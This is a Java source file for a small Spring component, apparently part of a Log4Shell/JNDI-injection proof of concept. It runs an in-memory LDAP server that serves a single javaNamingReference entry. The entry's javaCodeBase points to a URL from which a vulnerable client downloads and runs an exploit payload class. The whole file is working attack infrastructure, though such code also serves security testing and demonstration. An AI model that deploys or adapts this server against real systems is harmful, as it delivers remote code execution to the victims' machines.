/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.   
 */

package com.pasam.hacker;

import java.io.IOException;
import java.util.logging.Handler;
import java.util.logging.LogRecord;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;
import javax.naming.NamingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.ApplicationArguments;
import org.springframework.stereotype.Component;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Attribute;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;

/**
 * Simple in-memory LDAP server that only server one entry that points to the
 * location of the exploit payload Java class.
 *
 * @author Seshu Pasam
 */
@Component
public class Ldap {
  private static final String ARG_CLASS = "class";
  private static final String ARG_URL = "url";
  private static final String DEFAULT_DOWNLOAD_URL = "http://127.0.0.1";

  private String classDownloadURL;
  private String className;
  private InMemoryDirectoryServer ds;

  @Autowired
  private ApplicationArguments args;

  @Autowired
  @Value("${server.port}")
  public String listenPort;

  @PostConstruct
  public void start() throws LDAPException, IOException, NamingException {
    if (!args.containsOption(ARG_CLASS) || args.getOptionValues(ARG_CLASS).isEmpty()) {
      throw new RuntimeException("Invalid class name. Provide --" + ARG_CLASS + "=MyClass argument");
    }

    className = args.getOptionValues(ARG_CLASS).get(0);
    classDownloadURL = args.containsOption(ARG_URL) && !args.getOptionValues(ARG_URL).isEmpty()
        ? args.getOptionValues(ARG_URL).get(0)
        : DEFAULT_DOWNLOAD_URL + ":" + listenPort;
    if (!classDownloadURL.endsWith("/")) {
      classDownloadURL += "/";
    }

    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("o=a");
    config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("ldap", 1389));
    config.setAccessLogHandler(new LogHandler());
    Entry entry = new Entry("o=a", new Attribute("objectClass", "javaNamingReference"),
        new Attribute("javaClassName", className),
        // URL where the class can be downloaded from
        new Attribute("javaCodeBase", classDownloadURL),
        new Attribute("javaFactory", className));
    config.setRootDSEEntry(entry);

    ds = new InMemoryDirectoryServer(config);
    new Thread(() -> {
      try {
        ds.startListening();
      } catch (LDAPException e) {
        throw new RuntimeException(e);
      }
    }).start();
  }

  @PreDestroy
  public void stop() {
    ds.shutDown(true);
  }

  public static class LogHandler extends Handler {
    @Override
    public void close() throws SecurityException {
    }

    @Override
    public void flush() {
    }

    @Override
    public void publish(LogRecord record) {
      System.out.println(record.getMessage());
    }
  }
}